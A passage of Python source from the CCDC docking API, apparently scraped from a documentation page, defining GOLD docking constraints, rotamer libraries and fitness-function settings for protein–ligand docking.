    to skip such ligands, the setting :attr:`ccdc.docking.Docker.Settings.force_constraints` must be set to True

    :param protein_atom: an atom in the protein
    :param substructure: a :class:`ccdc.search.QuerySubstructure` object
    :param substructure_atom: an atom in the substructure
    :param limits: a tuple of size 2 that expresses the maximum and minimum allowed distances
    '''

    def __init__(self, protein_atom, substructure, substructure_atom, limits, weight=5.0, use_ring_centre=True,
                 substructure_file_name=None, _constraint=None):
        if not self._is_protein_atom(protein_atom):
            raise RuntimeError('Atom %s is not a protein atom' % protein_atom)
        if substructure_atom not in substructure.atoms:
            raise RuntimeError('Atom %s is not in the substructure' % substructure_atom)
        self._add_to_protein = protein_atom._molecule
        self.protein_atom = protein_atom
        self.substructure = substructure
        self.substructure_atom = substructure_atom
        self.limits = limits
        self.weight = weight
        self.use_ring_centre = use_ring_centre
        if substructure_file_name is None:
            substructure_file_name = 'substructure_' + substructure.identifier.replace(':', '_') + '.mol2'
        self.substructure_file_name = substructure_file_name
        if _constraint is None:
            _constraint = DockingLib.GoldSubstructureConstraint()
            _constraint.from_string(self._to_string())
        _constraint.substructure = substructure
        super(self.__class__, self).__init__(_constraint)

    def _to_string(self):
        return 'protein %d %s %d %.4f %.4f %.4f %s' % (
            self.protein_atom.index + 1,
            self.substructure_file_name,
            self.substructure_atom.index + 1,
            max(self.limits),
            min(self.limits),
            self.weight,
            'ring_center' if self.use_ring_centre else ''
        )

    @staticmethod
    def _from_string(settings, _constraint, protein_file=None):
        parts = _constraint.to_string().split()
        protein_atom = settings.proteins[0].atoms[int(parts[1]) - 1]
        if parts[-1] == 'ring_center':
            use_ring_centre = True
            last = -2
        else:
            use_ring_centre = False
            last = -1
        weight = float(parts[last])
        limits = (float(parts[last - 1]), float(parts[last - 2]))
        sub_index = int(parts[last - 3])
        substructure_file_name = ' '.join(parts[2:last - 3])
        substructure_file_name = os.path.join(os.path.dirname(settings.conf_file), substructure_file_name)
        if os.path.exists(substructure_file_name):
            substructure = io.MoleculeReader(substructure_file_name)[0]
        else:
            substructure = _constraint.substructure
        substructure_atom = substructure.atoms[sub_index - 1]
        return Docker.Settings.SubstructureConstraint(
            protein_atom, substructure, substructure_atom, limits, weight, use_ring_centre, substructure_file_name,
            _constraint
        )

    def _write_mol_files(self, settings):
        self.substructure_file_name = os.path.abspath(
            os.path.join(os.path.dirname(settings.conf_file), os.path.basename(self.substructure_file_name)))
        with io.MoleculeWriter(self.substructure_file_name) as writer:
            writer.write(self.substructure)


[docs]


class TemplateSimilarityConstraint(Constraint):
    '''A template similarity constraint.

    This is a fuzzy score reward; on docking the overlap of atoms in the docked pose is measured using the overlap
    of gaussians positioned at atoms in a template with atoms in the pose. The types of atoms assessed can be donor
    atoms, acceptor atoms or all atoms. The gaussian overlap is assessed and normalised into a range of 0->1; this
    is then multiplied by a weight to provide a score to add to the docking score as an overlap regard.

    :param type: must be 'donor', 'acceptor' or 'all'
    :param template: a :class:`ccdc.molecule.Molecule` instance
    :param template_file_name: where the template may be written.  If not provided, the identifier of the template will be used.
    :param weight: the maximum weight to be given in the event of an exact match with the template.
    '''

    def __init__(self, type, template, weight=5.0, template_file_name=None, _constraint=None):
        self.type = type.lower()
        if self.type not in ['donor', 'acceptor', 'all']:
            raise RuntimeError('Invalid type %s for TemplateSimilarityConstraint' % self.type)
        self.template = template
        if template_file_name is None:
            template_file_name = template.identifier + '.mol2'
        self.template_file_name = template_file_name
        self.weight = weight
        if _constraint is None:
            _constraint = DockingLib.GoldTemplateSimilarityConstraint()
            _constraint.from_string(self._to_string())
            _constraint.template = template
        super(self.__class__, self).__init__(_constraint)

    def _to_string(self):
        s = '%s %s %.4f' % (
            self.type, self.template_file_name, self.weight
        )
        return s

    @staticmethod
    def _from_string(settings, _constraint, protein_file=None):
        parts = _constraint.to_string().split()
        type = parts[0]
        weight = float(parts[-1])
        template_file_name = ' '.join(parts[1:-1])
        template_file_name = os.path.join(os.path.dirname(settings.conf_file), template_file_name)
        if os.path.exists(template_file_name):
            template = io.MoleculeReader(template_file_name)[0]
        else:
            template = _constraint.template
        return Docker.Settings.TemplateSimilarityConstraint(
            type, template, weight, template_file_name, _constraint
        )

    def _write_mol_files(self, settings):
        self.template_file_name = os.path.abspath(
            os.path.join(os.path.dirname(settings.conf_file), os.path.basename(self.template_file_name)))
        with io.MoleculeWriter(self.template_file_name) as writer:
            writer.write(self.template)


[docs]


class ScaffoldMatchConstraint(Constraint):
    '''A scaffold match constraint.

    A scaffold match constraint will attempt to force a substructure in an input ligand to match onto a template
    provided by the user. The template is substructure matched onto the ligand and then a distance constraint for
    each matching atom pair is added.

    :param molecule: a :class:`ccdc.molecule.Molecule` instance
    :param weight: a spring constant
    :param atoms: a list of :class:`ccdc.molecule.Atom` instances
    '''

    def __init__(self, molecule, weight=5.0, atoms=None, _constraint=None):
        self.molecule = molecule
        self.weight = weight
        self.atoms = atoms
        if _constraint is not None:
            self.file_name = _constraint.file_name
        else:
            self.file_name = 'scaffold_%s.mol2' % self.molecule.identifier.replace(':', '_')
        if _constraint is None:
            _constraint = DockingLib.GoldScaffoldMatchConstraint()
            _constraint.from_string(self._to_string())
            _constraint._molecule = molecule
        super(self.__class__, self).__init__(_constraint)

    @staticmethod
    def _from_string(settings, _constraint, protein_file=None):
        s = _constraint.to_string()
        if 'list' in s:
            indexes = s[s.index('list'):].split()[1:]
            s = s[:s.index('list')]
        else:
            indexes = None
        bits = s.split()
        weight = float(bits[-1])
        file_name = ' '.join(bits[:-1])
        file_name = os.path.join(os.path.dirname(settings.conf_file), file_name)
        _constraint.file_name = file_name
        if os.path.exists(file_name):
            with io.MoleculeReader(file_name) as reader:
                molecule = reader[0]
            if indexes:
                atoms = [molecule.atoms[int(i) - 1] for i in indexes]
            else:
                atoms = None
        else:
            molecule = None
            atoms = None
        return Docker.Settings.ScaffoldMatchConstraint(molecule, weight, atoms, _constraint)

    def _to_string(self):
        if self.atoms is not None:
            ats = ' list %s' % ' '.join('%d' % a.index for a in self.atoms)
        else:
            ats = ''
        s = '%s %.4f%s' % (self.file_name, self.weight, ats)
        return s

    def _write_mol_files(self, settings):
        self.file_name = os.path.abspath(
            os.path.join(os.path.dirname(settings.conf_file), os.path.basename(self.file_name)))
        with io.MoleculeWriter(self.file_name) as writer:
            writer.write(self.molecule)


[docs]


class RegionConstraint(Constraint):
    '''A region constraint.

    A region constraint is a coarse method for ensuring that either aromatic atoms, hydrophobic atoms or atoms
    indexes explicitly listed (these will be matched by index in the input ligands) occupy a particular spherical
    region in the binding site. Some of the functionality provided in this constraint is superceded by
    functionality in :class:`ccdc.docking.Docker.Settings.PharmacophoreConstraint`

    For the spherical binding site region, atoms should be specified using a list of :class:`ccdc.molecule.Atom`
    instances. Alternatively, it is possible to use either all hydrophobic ligand atoms, or to use only those
    hydrophobic atoms in aromatic rings by setting the optional ‘type’ parameter to 'hydrophobic' or
    'arom_ring_atoms' respectively.

    :param origin: a point in space
    :param radius: a radius of the sphere around the origin - this defines the sphere where a docked pose should have the desired atoms
    :param type: Must be one of 'hydrophobic atoms', 'arom_ring_atoms', ''None'' (default)
    :param weight: the value to add to the score if the constraint is not fulfilled
    :param atoms: a list of :class:`ccdc.molecule.Atom` instances whose indexes will be extracted
    '''

    def __init__(self, origin, radius, type, weight=5.0, atoms=None, _constraint=None):
        self.origin = origin
        if radius <= 0.0:
            raise RuntimeError('Invalid radius for RegionConstraint')
        self.radius = radius
        type = type.lower()
        if type.startswith('arom'):
            self.type = 'aromatic'
            self._type = 'arom_ring_atoms'
            if atoms is not None:
                raise RuntimeError('Atoms should not be provided if the type of a RegionConstraint is to be aromatic')
        elif type.startswith('hydro'):
            self.type = 'hydrophobic'
            self._type = 'hydrophobic_atoms'
            if atoms is not None:
                raise RuntimeError(
                    'Atoms should not be provided if the type of a RegionConstraint is to be hydrophobic')
        else:
            self.type = 'explicit'
            self._type = 'list'
            if atoms is None:
                raise RuntimeError('Atoms must be provided if the type of a RegionConstraint is to be explicit')
        self.atoms = atoms
        self.weight = weight
        if _constraint is None:
            _constraint = DockingLib.GoldRegionConstraint()
            _constraint.from_string(self._to_string())
        super(self.__class__, self).__init__(_constraint)

    def _to_string(self):
        s = '%.4f %.4f %.4f %.4f %.4f %s ' % (
            self.origin[0], self.origin[1], self.origin[2], self.radius, self.weight, self._type
        )
        if self.atoms is not None:
            s += ' '.join(str(a.index + 1) for a in self.atoms)
        return s

    @staticmethod
    def _from_string(settings, _constraint, protein_file=None):
        parts = _constraint.to_string().split()
        x = float(parts[0])
        y = float(parts[1])
        z = float(parts[2])
        r = float(parts[3])
        weight = float(parts[4])
        if parts[5] == 'list':
            type = 'list'
            atom_ids = [int(i) for i in parts[6:]]
            l = settings.ligands[0]
            atoms = [l.atoms[i - 1] for i in atom_ids]
        else:
            type = parts[5]
            atoms = None
        return Docker.Settings.RegionConstraint(
            (x, y, z), r, type, weight, atoms, _constraint
        )


[docs]


class PharmacophoreConstraint(Constraint):
    ''' A pharmacophore constraint.

    A PharmacophoreConstraint is in practice a docking reward: poses that match the constraint are rewarded with
    a contribution to the score. They are formulated as a point, a tolerance
    and then an overlay function with a given function shape.

    You can also optionally use them to add fitting points to the docking, which will make poses that match
    the pharmacophore more likely. If, in a pose, an atom or ring center of the proscribed type is within
    the distance tolerance specified, the score of the pose will be increased by the value of the
    score weight. If outside, the behaviour will vary depending on the function shape.

    A gaussian function shape will make the contribution to the score decay based on a gaussian with the excess
    distance. A block function shape will mean an atom outside the distance will contribute nothing to the score.

    :param origin: a point in space where the pharamcophore point will be placed
    :param type:   the type of pharmacophore point. Must be one of 'acceptor', 'donor_acceptor', 'donor', 'aromatic_center' or 'ring_center'
    :param radius: the distance a point in the pose can be away from the origin to be accepted as a match for the pharmacophore
    :param function_shape: how to score the match (can be gaussian or block.)
    :param use_as_fitting_point: whether to use the point additionally as a fitting point
    :param weight: the reward a perfect match to the pharmacophore makes in the score
    :param fitting_point_weight: the weight given to the associated fitting point
    '''

    def __init__(self, origin, type, radius, function_shape='block', use_as_fitting_point=True, weight=10.0,
                 fitting_point_weight=1.0, _constraint=None):

        if len(origin) != 3:
            raise RuntimeError('Invalid point coordinate %s', str(origin))

        if radius <= 0.0:
            raise RuntimeError('Invalid radius for PharmacophoreConstraint %.4f : must be greater than zero' % radius)

        if weight <= 0.0:
            raise RuntimeError('Invalid weight for PharmacophoreConstraint %.4f : must be greater than zero' % weight)

        if fitting_point_weight <= 0.0:
            raise RuntimeError(
                'Invalid fitting point weight for PharmacophoreConstraint %.4f : must be greater than zero' % fitting_point_weight)

        try:
            self._conf_type(type.lower())
        except KeyError:
            raise RuntimeError('Invalid pharmacophore point type %s - must be one of %s' % (
                type, ' '.join([key for key in self._TypeLookup]))
                               )
        try:
            self._conf_function_shape(function_shape.lower())
        except KeyError:
            raise RuntimeError('Invalid function shape %s - must be one of %s' % (
                function_shape, ' '.join([key for key in self._FunctionShapeLookup]))
                               )

        self.origin = origin
        self.radius = radius
        self.type = type.lower()
        self.function_shape = function_shape.lower()
        self.use_as_fitting_point = use_as_fitting_point
        self.weight = weight
        self.fitting_point_weight = fitting_point_weight

        if _constraint is None:
            _constraint = DockingLib.GoldPointConstraint()
            _constraint.from_string(self._to_string())
        super(self.__class__, self).__init__(_constraint)

    _TypeLookup = {
        "acceptor": "ACC",
        "donor_acceptor": "D_A",
        "donor": "DON",
        "aromatic_center": "ARO_CNT",
        "aromatic_centre": "ARO_CNT",
        "ring_center": "RING_CNT",
        "ring_centre": "RING_CNT"
    }

    _FunctionShapeLookup = {
        "gaussian": "GAUSS",
        "block": "BLOCK"
    }

    @classmethod
    def _conf_type(cls, api_type):
        return cls._TypeLookup[api_type]

    @classmethod
    def _api_type(cls, conf_type):
        for x in cls._TypeLookup:
            if conf_type == cls._TypeLookup[x]:
                return x

        raise RuntimeError("No such type supported in GOLD configuration file")

    @classmethod
    def _conf_function_shape(cls, api_function_shape):
        return cls._FunctionShapeLookup[api_function_shape]

    @classmethod
    def _api_function_shape(cls, conf_function_shape):
        for x in cls._FunctionShapeLookup:
            if conf_function_shape == cls._FunctionShapeLookup[x]:
                return x

        raise RuntimeError("No such overlay function supported in GOLD configuration file")

    def _to_string(self):
        s = '%s %s %.4f %.4f %.4f %d %.4f %.4f %.4f ' % (
            self._conf_type(self.type), self._conf_function_shape(self.function_shape), self.origin[0], self.origin[1],
            self.origin[2], self.use_as_fitting_point, self.radius, self.weight, self.fitting_point_weight
        )
        return s

    @staticmethod
    def _from_string(settings, _constraint, protein_file=None):
        parts = _constraint.to_string().split()
        type = Docker.Settings.PharmacophoreConstraint._api_type(parts[0])
        function_shape = Docker.Settings.PharmacophoreConstraint._api_function_shape(parts[1])
        x = float(parts[2])
        y = float(parts[3])
        z = float(parts[4])
        use_as_fitting_point = bool(int(parts[5]))
        radius = float(parts[6])
        weight = float(parts[7])
        fitting_point_weight = float(parts[8])

        return Docker.Settings.PharmacophoreConstraint(
            (x, y, z), type, radius, function_shape, use_as_fitting_point, weight, fitting_point_weight, _constraint
        )


@property
def constraints(self):
    '''The tuple of constraints set.'''
    if not self._constraints:
        self._constraints = [
            Docker.Settings.Constraint._make_constraint(self, self._settings.constraint(i))
            for i in range(self._settings.nconstraints())
        ]
        for pinfo in self.protein_files:
            self._constraints.extend(pinfo.constraints)
    return self._constraints


[docs]


def clear_constraints(self):
    '''Clears the set of constraints.'''
    self._constraints = []
    self._settings.clear_constraints()
    for pfinfo in self.protein_files:
        pfinfo._protein_data.clear_constraints()


[docs]


def add_constraint(self, constraint):
    '''Add a constraint to the docking.

    :param constraint: :class:`ccdc.docking.Docker.Settings.Constraint` instance.
    '''
    if hasattr(constraint, '_add_to_protein'):
        for p, inf in zip(self.proteins, self.protein_files):
            if p._molecule == constraint._add_to_protein:
                inf.add_constraint(constraint)
                break
        else:
            raise RuntimeError('Cannot find appropriate protein.')
    else:
        self._settings.add_constraint(constraint._constraint)
    self._constraints.append(constraint)


@property
def force_constraints(self):
    '''Whether the constraints are to be forced.'''
    return self._settings.force_constraints()


@force_constraints.setter
def force_constraints(self, tf):
    self._settings.set_force_constraints(tf)


# Rotamer Angle Range
[docs]


@nested_class('Docker.Settings')
class RotamerAngleRange():
    '''A rotamer angle range.

    :param angle_range: a tuple representing the angle range

    The tuple must include one, two or three elements, which represent
    the following cases respectively:
        1. The angle is set, the deltas are set to 0
        2. The angle is set with the first element, the deltas are set with the second element
        3. The angle is set with the first element, the lower delta is set with the second element, the upper delta is set with the third element

    '''

    def __init__(self, angle_range=(0,)):
        '''Create a rotamer angle range

        :param angle_range: A tuple representing the angle range
        '''
        if len(angle_range) > 3:
            raise ValueError('Expect a tuple of length 3 or less')

        self._angle_range = DockingLib.RotamerAngleRange(*angle_range)

    def __rep__(self):
        return f'({self.angle},{self.min_delta},{self.max_delta})'

    __str__ = __rep__

    @property
    def angle(self):
        '''Get and set the angle (in degrees)'''
        return self._angle_range.angle()

    @angle.setter
    def angle(self, angle):
        self._angle_range.set_angle(angle)

    @property
    def min_delta(self):
        '''Get and set the lower delta (in degrees)'''
        return self._angle_range.min_delta()

    @min_delta.setter
    def min_delta(self, min_delta):
        self._angle_range.set_deltas(min_delta, self._angle_range.max_delta())

    @property
    def max_delta(self):
        '''Get and set the upper delta (in degrees)'''
        return self._angle_range.max_delta()

    @max_delta.setter
    def max_delta(self, max_delta):
        self._angle_range.set_deltas(self._angle_range.min_delta(), max_delta)


# Rotamer
[docs]


@nested_class('Docker.Settings')
class Rotamer():
    '''A rotamer in a rotamer library.

    :param num_torsions: the number of torsions in the residue

    The torsions can be accessed or set via ``chi<n>`` attributes.
    For examples::

        rotamer = Docker.Settings.Rotamer(3)
        rotamer.energy = 10

        rotamer.chi1 = (-60,)
        rotamer.chi2 = (-75, 10)
        rotamer.chi3 = (-90, 10, 20)

        assert(rotamer.chi1.angle, -60)
        assert(rotamer.chi2.min_delta, 10)
        assert(rotamer.chi3.max_delta, 20)

    '''

    def __init__(self, num_torsions, rotamer=None):
        '''Create a rotamer for a residue

        '''
        if num_torsions > 9:
            raise ValueError('Invalid number of angles')
        self._num_torsions = num_torsions
        # This dictionary stores the mapping of chi_n's to the
        # RotamerAngleRange objects.
        self._chis = {}

        if rotamer is not None:
            # Initiate from an existing internal rotamer object
            self._rotamer = rotamer
            for index in range(self._num_torsions):
                ar = rotamer.angle(index)
                self._chis[f'chi{index + 1}'] = Docker.Settings.RotamerAngleRange(
                    (ar.angle(), ar.min_delta(), ar.max_delta()))
        else:
            # Initiate a default (0,0,0) rotamer
            self._rotamer = DockingLib.Rotamer()
            for index in range(self._num_torsions):
                self._chis[f'chi{index + 1}'] = Docker.Settings.RotamerAngleRange()
                self._rotamer.insert(index, self._chis[f'chi{index + 1}']._angle_range)

    def __getattribute__(self, attr):
        if attr.startswith('chi'):
            if attr not in self._chis:
                raise AttributeError
            else:
                return self._chis[attr]
        return object.__getattribute__(self, attr)

    def __setattr__(self, attr, value):
        if attr.startswith('chi'):
            if attr not in self._chis:
                raise AttributeError
            else:
                self._chis[attr] = Docker.Settings.RotamerAngleRange(value)
                self._rotamer.set_angle(int(attr[3]) - 1,
                                        self._chis[attr]._angle_range)
        return super().__setattr__(attr, value)

    @property
    def improper(self):
        '''Get or set whether the rotamer is improper'''
        return self._rotamer.improper()

    @improper.setter
    def improper(self, is_improper):
        self._rotamer.set_improper(is_improper)

    @property
    def improper_angle(self):
        '''Get or set the improper angle

        If setting the improper angle, the tuple must include one, two
        or three elements, which represent the following cases
        respectively:

        1. The angle is set, the deltas are set to 0
        2. The angle is set with the first element, the deltas are set with the second element
        3. The angle is set with the first element, the lower delta is set with the second element, the upper delta is set with the third element

        :returns: a :class:`ccdc.docking.Docker.Settings.RotamerAngleRange` object
        :raises: RuntimeError if rotamer is not an improper rotamer
        '''
        if self.improper:
            ia = self._rotamer.improper_angle()
            return Docker.Settings.RotamerAngleRange(
                (ia.angle(), ia.min_delta(), ia.max_delta())
            )
        else:
            raise RuntimeError('Not an improper rotamer')

    @improper_angle.setter
    def improper_angle(self, improper_angle=(0, 10)):
        if self.improper:
            ia_range = DockingLib.RotamerAngleRange(*improper_angle)
            return self._rotamer.set_improper_angle(ia_range)
        else:
            raise RuntimeError('Not an improper rotamer')

    @property
    def energy(self):
        '''Get or set the rotamer energy'''
        return self._rotamer.energy()

    @energy.setter
    def energy(self, energy):
        self._rotamer.set_energy(energy)


# Rotamer Library
[docs]


@nested_class('Docker.Settings')
class RotamerLibrary():
    '''A rotamber library associated with a protein binding site.

    A binding site should have been configured because a residue from
    the list of binding site residues is required to create this.

    :param protein_file_info: the :class:`Docker.Settings.ProteinFileInfo` object the rotamer library is associated with
    :param residue: the residue of the binding site the rotamer library is associated with

    '''

    def __init__(self, protein_file_info, residue, _rotamer_library=None):
        '''Create a rotamer library for a residue of the binding site

        '''
        self.DEFAULT_LIBRARY = Docker.Settings._path_in_distribution("rotamer_library.txt")
        self._protein_file_info = protein_file_info
        self._residue = residue
        self._rotamer_library = _rotamer_library
        self._improper = False
        if self._rotamer_library is not None:
            self._improper = self._rotamer_library.improper()

        # translate the AA three letter code to the FileFormatsLib.AminoAcid.Type enum e.g. AminoAcid::GLU
        self._residue_type = FileFormatsLib.AminoAcid.amino_acid_type(self._residue.three_letter_code)
        self._num_torsions = FileFormatsLib.num_residue_torsion_atoms(residue._residue) - 3
        # Get the improper angle
        improper_atoms = FileFormatsLib.improper_torsion_atoms(self._residue._residue)
        indices = []
        for atom in improper_atoms:
            indices.append(atom.annotations().obtain_FileOrdering().file_order())
        self.rotamer_angle = DockingLib.RotamerAngle("Improper", *indices)
        self.improper_angle = FileFormatsLib.improper_torsion_angle_degree(self._residue._residue)

    @staticmethod
    def _make_rotamer_library(settings, protein, protein_file_info, _rotamer_library):
        # This contains the residue name
        rotamer_library_name = [_rotamer_library.name()]
        # A cleaned up version of the residue name
        rotamer_library_name.append(rotamer_library_name[0].replace('_', '').upper())

        # Use the residue atoms to create binding site
        residue_atom_indices = set()
        for angle in _rotamer_library.angles():
            residue_atom_indices.update([angle.index(ii) for ii in range(4)])
        atoms = [protein.atoms[i] for i in residue_atom_indices]
        binding_site = Docker.Settings.BindingSiteFromListOfAtoms(protein, atoms)

        # Cycle through the binding site reisdues to find the one
        # that matche the rotamer library name
        residue = None
        for rr in binding_site.residues:
            if any([rr.identifier.endswith(rln) for rln in rotamer_library_name]):
                residue = rr
                break

        if residue is not None:
            return Docker.Settings.RotamerLibrary(protein_file_info, residue, _rotamer_library)
        else:
            return None

    def __len__(self):
        if self._rotamer_library is not None:
            return self._rotamer_library.n_rotamers()
        else:
            return 0

    @property
    def number_of_torsions(self):
        '''Number of torsion angles of the associated residue'''
        return self._num_torsions

    @property
    def improper(self):
        return self._improper

    def _reset_improper(self):
        if self._rotamer_library != None:
            if self._rotamer_library.n_angles() <= 1:
                self._rotamer_library = None
            else:
                self._rotamer_library.remove_improper()


[docs]


def set_improper(self, is_improper, deltas=(10,)):
    '''To set the improper status of the rotamer library

    :param is_improper: a boolean for the improper state
    :param deltas: a tuple of 1 or 2 to define the rotamer angle ranges for improper angle
    '''

    if self.improper == is_improper and is_improper == False:
        return
    if self.improper == is_improper and is_improper == True:
        self._reset_improper()

    self._improper = is_improper

    if is_improper == True:
        # If the rotamer_libary is empty, create a crystal rotamer library
        if self._rotamer_library == None:
            # Get torsions
            torsions = FileFormatsLib.residue_torsions(self._residue._residue)
            # Create a library with the crystal structure
            self._rotamer_library = DockingLib.RotamerLibrary(self._residue._residue, torsions, 0)

        rotamer_angle_range = DockingLib.RotamerAngleRange(self.improper_angle, *deltas)

        # Update the rotamer library
        self._rotamer_library.insert_improper(self.rotamer_angle, rotamer_angle_range)
    else:
        self._reset_improper()

    # Update the protein data accordingly
    protein_data = self._protein_file_info._protein_data
    rls = protein_data.rotamer_libraries()
    protein_data.clear_rotamer_libraries()
    for rl in rls:
        if rl.name() == self._rotamer_library.name():
            protein_data.add_rotamer_library(self._rotamer_library)
        else:
            protein_data.add_rotamer_library(rl)


[docs]


def add_default_rotamers(self, deltas=(10,)):
    '''Add default rotamers for this residue

    The rotamers are read from rotamer_library.txt in the distribution.

    This is equivalent to the "Library" button in the Hermes GUI.

    :param deltas: the angle range to be set for improper angle, if applicable
    '''
    default_library = DockingLib.GoldConfProteinData.read_rotamer_library(self.DEFAULT_LIBRARY,
                                                                          self._residue_type)

    if self._rotamer_library == None:
        self._rotamer_library = DockingLib.RotamerLibrary(self._residue._residue, default_library)
    else:
        if self._improper:
            rotamer_angle_range = DockingLib.RotamerAngleRange(self.improper_angle, *deltas)
            default_library.insert_improper(self.rotamer_angle, rotamer_angle_range)

        rotamers = default_library.rotamers()
        for r in rotamers:
            self._rotamer_library.add_rotamer(r)


[docs]


def add_crystal_rotamer(self, delta=10):
    '''Add a rotamer corresponding to the residue in the crystal

    This is equivalent to the "Crystal" button in the Hermes GUI.

    :param delta: the tolerance of the crystal rotamer angle, and also for improper angle
    '''

    # Get torsions
    torsions = FileFormatsLib.residue_torsions(self._residue._residue)

    # Create a library with the crystal structure
    library_with_crystal = DockingLib.RotamerLibrary(self._residue._residue, torsions,
                                                     delta)
    if self._improper:
        rotamer_angle_range = DockingLib.RotamerAngleRange(self.improper_angle, delta)
        library_with_crystal.insert_improper(self.rotamer_angle, rotamer_angle_range)

    if self._rotamer_library != None:
        rotamers = self._rotamer_library.rotamers()
        for r in rotamers:
            library_with_crystal.add_rotamer(r)

    self._rotamer_library = library_with_crystal


[docs]


def add_free_rotamer(self, deltas=(10,)):
    '''Add a free (delta=180) rotamer

    This is equivalent to the "Free" button in the Hermes GUI.

    Doing this will remove all existing rotamers in this library.

    :param deltas: the angle range to be set for improper angle, if applicable
    '''
    self._rotamer_library = DockingLib.RotamerLibrary(self._residue._residue)

    if self._improper:
        rotamer_angle_range = DockingLib.RotamerAngleRange(self.improper_angle, *deltas)
        self._rotamer_library.insert_improper(self.rotamer_angle, rotamer_angle_range)


[docs]


def add_rotamer(self, rotamer, angle=0, deltas=(10,)):
    '''Add a user-defined rotamer

    This is equivalent to the "From dials" button in the Hermes GUI.

    :param rotamer: a :class:`ccdc.docking.Docker.Settings.Rotamer` object to add
    :param angle: the improper angle to be set, if applicable
    :param deltas: the angle range to be set for improper angle, if applicable
    '''

    if self._improper:
        rotamer_angle_range = DockingLib.RotamerAngleRange(angle, *deltas)
        rotamer._rotamer.insert_improper(rotamer_angle_range)

    if self._rotamer_library == None:
        self._rotamer_library = DockingLib.RotamerLibrary(self._residue._residue)
        self._rotamer_library.set_rotamer(0, rotamer._rotamer)
    else:
        self._rotamer_library.add_rotamer(rotamer._rotamer)


[docs]


def remove_rotamer(self, index):
    '''Remove a rotamer from the library

    :param index: the index of the rotamer to remove
    :returns: the rotamer removed from the library
    '''
    rotamer = self.rotamers()[index]
    DockingLib.remove_rotamer(self._rotamer_library, index)
    return rotamer


[docs]


def remove_rotamers(self):
    '''Remove all rotamers

    This is equivalent to the "Rigid" button in the Hermes GUI.
    '''
    self._rotamer_library = None
    self._improper = False


[docs]


def rotamers(self):
    '''Return the list of rotamers from this rotamer library

    Note that the returned objects are views of the rotamers in the
    settings. Changing them does not change the settings.

    :returns: list of :class:`ccdc.docking.Docker.Settings.Rotamer` objects
    '''
    return [Docker.Settings.Rotamer(self._num_torsions, r) for r in self._rotamer_library.rotamers()]


[docs]


def rotamer_libraries(self, protein=None):
    '''Get the set of defined rotamer libraries

    If protein is None all rotamer libraries in the settings will be
    returned. Otherise only rotamer libraries associated with the
    protein will be returned.

    :param protein: A :class:`ccdc.docking.Docker.Settings.Protein` instance
    :returns: A list of :class:`ccdc.docking.Docker.Settings.RotamerLibrary objects
    '''
    if not hasattr(self, '_rotamer_info'):
        _ = self.protein_files  # in case the protein info hasnt been assigned yet
        # Set up the rotamers
        for index, p in enumerate(self._protein_info):
            rotamer_libraries = p._protein_data.rotamer_libraries()
            for rl in rotamer_libraries:
                rotamerlibrary = Docker.Settings.RotamerLibrary._make_rotamer_library(
                    self, self.proteins[index], p, rl)
                if rotamerlibrary:
                    p._rotamer_libraries.append(rotamerlibrary)
    self._rotamer_info = True

    rotamer_libraries = []
    for prot, info in zip(self.proteins, self.protein_files):
        if protein is None or prot == protein:
            rotamer_libraries.extend(info.rotamer_libraries)
    return rotamer_libraries


[docs]


def rotamer_library(self, protein, residue_id):
    '''Return the rotamer library for this residue in this protein

    :param protein: A :class:`ccdc.docking.Docker.Settings.Protein` instance
    :param residue_id: A residue ID string
    :returns: A :class:`ccdc.docking.Docker.Settings.RotamerLibrary objects
    '''
    p_rotamer_libraries = self.rotamer_libraries(protein)
    for rotamer_library in p_rotamer_libraries:
        if rotamer_library._residue.identifier.endswith(residue_id):
            return rotamer_library
    return None


[docs]


def add_rotamer_library(self, protein, rotamer_library):
    '''Add a rotamer library to a protein

    :param protein: A :class:`ccdc.docking.Docker.Settings.Protein` instance
    :param rotamer_library: A :class:`ccdc.docking.Docker.Settings.RotamerLibrary` instance to add
    :raises: ValueError if protein cannot be found
    '''
    for prot, info in zip(self.proteins, self.protein_files):
        if prot == protein:
            info.add_rotamer_library(rotamer_library)
            break
    else:
        raise ValueError('Cannot find appropriate protein.')


[docs]


def update_rotamer_library(self, protein, rotamer_library):
    '''Update a rotamer library to a protein

    The name of the rotamer library is used to determine which existing
    library to update.

    :param protein: A :class:`ccdc.docking.Docker.Settings.Protein` instance
    :param rotamer_library: A :class:`ccdc.docking.Docker.Settings.RotamerLibrary` instance to update
    :raises: ValueError if protein cannot be found
    '''
    for prot, info in zip(self.proteins, self.protein_files):
        if prot == protein:
            info.update_rotamer_library(rotamer_library)
            break
    else:
        raise ValueError('Cannot find appropriate protein.')


[docs]


def clear_rotamer_libraries(self):
    '''Remove all rotamer libraries'''
    for pfinfo in self.protein_files:
        pfinfo.clear_rotamer_libraries()


# Fitness function
@property
def fitness_function(self):
    '''Which fitness function to use.

    Options are 'goldscore', 'chemscore', 'asp', 'plp'. GoldScore is selected by default.

    Note that if you pass in 'None' the API will assume you are planning a rescoring run, set
    the fitness function to the rescore function, and set the run type as a rescore-only run. One other
    side effect of this will be to disable :attr:`use_internal_ligand_energy_offset`
    '''
    return self._fitness_function


@fitness_function.setter
def fitness_function(self, value):
    if not value:
        self._fitness_function = ''
        self._settings.set_gold_fitness_function_path(self._rescore_function)
        self._settings.set_run_type(self._settings.RESCORE_RUN)
        self._settings.set_use_relative_ligand_energy(False)
    else:
        value = value.lower()
        if value in self._fitness_functions:
            self._fitness_function = value
            self._settings.set_gold_fitness_function_path(value)
            if self._rescore_function:
                self._settings.set_gold_fitness_function_path('consensus_score')
                self._settings.set_docking_fitness_function_path(value)
                self._settings.set_rescore_fitness_function_path(self._rescore_function)
                self._settings.set_run_type(self._settings.CONSENSUS_SCORE)
            else:
                self._settings.set_run_type(self._settings.STANDARD_RUN)
        else:
            raise TypeError('%s is not a recognised fitness function' % value)


@property
def use_internal_ligand_energy_offset(self):
    '''Get or set whether to apply a score offset in scoring that accounts for the lowest ligand energy observed
       in the search (can be True or False)

       Note that this only applies when running a full docking run. If you try to set this for a rescoring run,
       you will get a ValueError raised, as rescoring runs do not have access to the previous GA sampling.
    '''
    return self._settings.use_relative_ligand_energy()


@use_internal_ligand_energy_offset.setter
def use_internal_ligand_energy_offset(self, value):
    setting = bool(value)
    if self._settings.run_type() == self._settings.RESCORE_RUN and setting:
        raise ValueError("Rescore runs can not use an internal ligand energy offset")
    self._settings.set_use_relative_ligand_energy(setting)


@property
def rescore_function(self):
    '''The fitness function used for rescoring.

    Should not be the same as the fitness function.
    '''
    return self._rescore_function


@rescore_function.setter
def rescore_function(self, value):
    '''Set the rescore function.
    Note that if you pass in 'None' the API will assume you are planning a standard docking run.

